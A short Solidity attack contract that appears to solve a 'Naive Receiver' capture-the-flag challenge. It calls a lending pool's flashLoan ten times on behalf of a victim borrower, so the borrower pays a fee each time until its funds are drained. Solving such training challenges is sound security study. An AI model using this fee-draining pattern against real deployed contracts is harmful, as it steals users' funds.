// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveAttacker {
    function exploit(
        NaiveReceiverLenderPool pool, 
        IERC3156FlashBorrower borrower, 
        address token,
        uint256 borrowAmount
    ) external {
        for(uint8 i=0;i<10;i++){
            pool.flashLoan(borrower, token, borrowAmount, "");
        }
    }
}